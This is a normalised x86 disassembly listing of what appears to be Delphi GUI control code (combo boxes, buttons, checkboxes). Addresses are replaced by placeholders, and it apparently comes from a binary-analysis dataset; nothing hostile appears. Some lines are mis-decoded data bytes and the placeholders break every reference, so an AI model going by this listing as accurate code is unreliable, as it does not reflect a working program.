mov eax ebx
call sub_44ea78
mov dl 0x1
mov eax [ r-xdata ]
call sub_42541c
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_44d490
mov [ ebx + 0x238 ] 0x10
push ebx
push sub_444a28
call sub_422b0c
mov [ ebx + 0x24c ] eax
push ebx
push sub_444b20
call sub_422b0c
mov [ ebx + 0x254 ] eax
mov [ ebx + 0x210 ] 0x8
mov [ ebx + 0x214 ] 0xffffffff
mov [ ebx + 0x260 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_4447e0
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_4553b8
test al al
je r-xdata
mov eax [ esi + 0x254 ]
call sub_465674
mov eax [ esi + 0x24c ]
call sub_465674
mov eax [ esi + 0x208 ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_450f04
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_444862
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_4524a8
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
xor eax eax
mov [ ebx + 0x248 ] eax
pop ebx
retn
sub_4448ac
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x157
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_4448d0
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
push 0x0
xor eax eax
mov al bl
push eax
push 0x14f
mov eax esi
call sub_4550b4
push eax
call SendMessageA
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax esi
call sub_4550b4
push eax
call InvalidateRect
add esp 0x10
pop esi
pop ebx
retn
sub_444918
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
push 0x0
push 0x0
push 0x147
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
pop ebx
retn
mov eax [ ebx + 0x214 ]
pop ebx
retn
sub_444944
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
mov [ ebx + 0x214 ] esi
pop esi
pop ebx
retn
pop esi
pop ebx
retn
push 0x0
push esi
push 0x14e
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
sub_444990
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x64 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x64 ]
push eax
mov eax esi
call sub_4550b4
push eax
call SetWindowTextA
sub_4449cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_4448ac
test al al
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x4
sub_444a04
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4546cc
pop esi
pop ebx
retn
mov eax ebx
call sub_452654
sub_444a28
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ esi ] 0x112
jne r-xdata
mov eax [ esi ]
cmp eax 0x100
jb r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
jmp r-xdata
mov eax [ ebx + 0x250 ]
push eax
mov edx esi
mov ecx [ ebx + 0x240 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xf4 ]
mov eax [ esi ]
sub eax 0x30
je r-xdata
cmp eax 0x108
ja r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
sub eax 0x1d1
je r-xdata
mov eax ebx
call sub_4657c8
mov edi eax
test edi edi
je r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
sub eax 0x2
jne r-xdata
mov ecx esi
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_44e3f8
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406e64
push eax
push 0x0
push 0x202
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_44ef74
jmp r-xdata
sub_444ba7
add [ eax ] eax
add [ eax + 0xf ] cl
test ah dl
add [ eax ] al
add cl ch
add al [ edx ]
add [ eax ] al
cmp eax 0xbd00
jg r-xdata
sub eax 0xbd02
je r-xdata
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
sub eax 0x105
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_453ff0
test al al
je r-xdata
sub eax 0xfb
je r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
mov eax [ ebp + 0x8 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
cmp [ ebx ] 0x203
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46ef74
jmp r-xdata
sub eax 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x80
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_443840
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_403518
movsx eax [ ebx + 0x8 ]
mov [ ebp - 0xc ] eax
movsx eax [ ebx + 0xa ]
mov [ ebp - 0x8 ] eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
push esi
call MapWindowPoints
mov ax [ ebp - 0xc ]
mov [ ebx + 0x8 ] ax
mov ax [ ebp - 0x8 ]
mov [ ebx + 0xa ] ax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_444c85
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4540b8
test al al
je r-xdata
mov di [ ebx + 0x4 ]
cmp di 0xd
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4448ac
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
mov eax [ ebp + 0x8 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
cmp [ ebx ] 0x203
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4448d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x80
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_403518
sub_444e1c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
sub eax 0x5
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub eax 0xfd
je r-xdata
mov eax ebx
call sub_44f03c
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
mov edx esi
mov eax ebx
call sub_452ac8
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_4540b8
test al al
jne r-xdata
add eax 0xffffffd0
sub eax 0x7
jb r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
cmp di 0xd
je r-xdata
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_424640
push eax
mov eax [ esi + 0x4 ]
push eax
call SetTextColor
mov eax [ ebx + 0x170 ]
call sub_4252c4
call sub_424640
push eax
mov eax [ esi + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0x170 ]
call sub_425300
mov [ esi + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov edx esi
mov eax ebx
call sub_452a34
test al al
jne r-xdata
mov eax ebx
call sub_4448ac
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
xor edx edx
mov eax ebx
call sub_4448d0
jmp r-xdata
sub_444f2a
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_445088
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ edx + 0x6 ]
cmp eax 0x8
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44508f
lea eax [ ebp - 0x4 ]
call sub_404118
retn
jmp [ eax * 4 + jump_table_444f58 ]
mov eax edi
mov si 0xffe9
call sub_403518
jmp r-xdata
mov eax edi
mov si 0xffb3
call sub_403518
jmp r-xdata
mov [ edi + 0x25d ] 0x0
mov eax edi
mov si 0xffb1
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ edi + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44e8e4
mov eax edi
mov si 0xffeb
call sub_403518
mov eax edi
mov si 0xffb2
call sub_403518
jmp r-xdata
mov eax edi
mov si 0xffb0
call sub_403518
jmp r-xdata
mov [ edi + 0x25e ] 0x1
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_453838
jmp r-xdata
mov [ edi + 0x25e ] 0x0
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_453924
sub_444fa9
call sub_403518
mov eax edi
mov edx [ eax ]
call [ edx + 0xf0 ]
cmp [ edi + 0x25d ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44508f
lea eax [ ebp - 0x4 ]
call sub_404118
retn
push 0x0
push 0x0
push 0x1f
mov eax edi
call sub_4550b4
push eax
call PostMessageA
cmp [ edi + 0x25e ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x14f
mov eax edi
call sub_4550b4
push eax
call PostMessageA
jmp r-xdata
sub_4450dc
push esi
push edi
mov esi eax
mov eax esi
call sub_450988
mov edi [ esi + 0x214 ]
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_445104
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4553b8
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_445158
push ebx
push esi
cmp [ eax + 0x222 ] 0x0
je r-xdata
mov si 0xffb3
call sub_403518
pop esi
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
pop esi
pop ebx
retn
sub_445184
push ebx
mov ebx eax
mov eax ebx
call sub_45206c
push 0x0
mov eax [ ebx + 0x20c ]
push eax
push 0x141
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
pop ebx
retn
sub_4451bc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
cmp ebx eax
jle r-xdata
cmp ebx 0x1
jge r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x1
xor eax eax
push ebp
push sub_445252
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x9e
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xfc ]
imul ebx
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x4c ]
add eax 0x2
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445259
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x0
retn
mov ebx 0x1
sub_445259
push 0x5f
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
pop ebx
pop ecx
pop ebp
retn
sub_445278
push esi
push edi
mov esi eax
mov edi [ esi + 0x23c ]
test edi edi
je r-xdata
mov [ esi + 0x23c ] edx
pop edi
pop esi
retn
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
retn
sub_4452a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_445327
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44532e
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax esi
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
sub_445334
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_44537b
int1
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_4453bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4453c4
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_4453cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_450dac
mov eax esi
mov edx [ r-xdata ]
call sub_4034cc
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_4453f0
push ebx
mov ebx eax
mov eax ebx
call sub_45af1c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4034cc
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_445428
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_44547e
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_44548c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_450de0
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_4454e0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_455b84
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_445534
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_445558
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_452ac8
mov eax ebx
mov si 0xffb5
call sub_403518
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_4550b4
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_403518
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_4455d0
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_43f31c
mov ebx eax
mov eax ebx
call sub_43f3fc
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4550b4
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_43f4fc
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44561c
push ebx
push esi
mov esi edx
mov ebx eax
call sub_43f31c
call sub_43f3fc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_453508
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_445648
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_451f40
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_445680
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44548c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_44e070
mov edx 0x19
mov eax esi
call sub_44e094
mov dl 0x1
mov eax esi
call sub_4552e8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_44570c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_4553b8
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_4550b4
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_4550b4
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_445760
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_4553b8
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_4657c8
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_44fa80
sub_445794
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445648
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_451e6c
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_4457fc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_454530
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_4656d0
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_403518
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403518
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_445869
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4458e2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44e8b4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_465758
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_454538
mov eax ebx
mov si 0xffb8
call sub_403518
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403518
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4458e9
sub_4458f0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_454540
pop edi
pop esi
pop ebx
retn
sub_445944
push ebx
push esi
mov esi edx
mov ebx eax
call sub_43f31c
call sub_43f3fc
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_445970
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_43f31c
mov ebx eax
mov eax ebx
call sub_43f3fc
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4550b4
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_43f4fc
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4459bc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44548c
mov edx 0x61
mov eax esi
call sub_44e070
mov edx 0x11
mov eax esi
call sub_44e094
mov dl 0x1
mov eax esi
call sub_4552e8
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_445a28
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403518
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_445a54
mov dl [ eax + 0x212 ]
sub dl 0x1
jb r-xdata
cmp [ eax + 0x211 ] 0x0
je r-xdata
je r-xdata
mov dl 0x1
call sub_445adc
retn
mov dl 0x2
call sub_445adc
jmp r-xdata
xor edx edx
call sub_445adc
retn
dec dl
je r-xdata
retn
mov dl 0x1
call sub_445adc
jmp r-xdata
sub_445adc
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x212 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_4553b8
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_403518
sub_445b30
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_445648
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_451e6c
mov eax ebx
mov si 0xffc8
call sub_403518
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x5
or eax edx
mov [ edi + 0x4 ] eax
and [ edi + 0x24 ] 0xfffffffc
pop edi
pop esi
pop ebx
retn
sub_445b8b
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x3b29173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
pop ebx
retn
sub_445bd4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_445c62
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44e8b4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_465758
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_454538
mov eax ebx
mov si 0xffb8
call sub_403518
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax ebx
mov si 0xffb5
call sub_403518
test al al
je r-xdata
mov [ edi + 0xc ] 0x1
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445c69
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_445c80
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44548c
mov edx 0x71
mov eax esi
call sub_44e070
mov edx 0x11
mov eax esi
call sub_44e094
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_445ce8
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403518
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_445d28
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_451de4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
